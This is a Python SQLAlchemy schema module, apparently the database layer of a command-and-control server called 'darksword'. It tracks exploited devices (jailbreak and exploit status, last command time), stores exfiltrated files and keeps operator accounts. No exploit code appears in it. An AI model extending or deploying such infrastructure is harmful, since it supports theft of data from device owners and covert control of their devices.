from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
from datetime import datetime
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
DATABASE_URL = f"sqlite:///{PROJECT_ROOT / 'darksword.db'}"

engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()


class Log(Base):
    __tablename__ = "logs"
    
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.now)
    ip = Column(String(50))
    method = Column(String(10))
    path = Column(String(255))
    status_code = Column(Integer)
    content_length = Column(Integer)
    user_agent = Column(String(500))
    log_type = Column(String(20))
    device_uuid = Column(String(100), index=True, nullable=True)


class Device(Base):
    __tablename__ = "devices"
    
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), unique=True, index=True)
    first_seen = Column(DateTime, default=datetime.now)
    last_seen = Column(DateTime, default=datetime.now)
    ip = Column(String(50))
    user_agent = Column(String(500))
    status = Column(String(20), default="active")
    os_version = Column(String(50))
    device_model = Column(String(100))
    chipset = Column(String(100))
    jailbroken = Column(String(10), default="unknown")
    exploit_status = Column(String(20), default="pending")
    last_command_time = Column(DateTime)


class ExfilData(Base):
    __tablename__ = "exfil_data"
    
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), index=True)
    category = Column(String(50))
    path = Column(String(500))
    description = Column(Text)
    file_path = Column(String(500))
    file_size = Column(Integer)
    uploaded_at = Column(DateTime, default=datetime.now)


class User(Base):
    __tablename__ = "users"
    
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String(50), unique=True, index=True)
    password = Column(String(200))
    role = Column(String(20), default="operator")
    created_at = Column(DateTime, default=datetime.now)
    last_login = Column(DateTime)


def init_db():
    Base.metadata.create_all(bind=engine)


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()
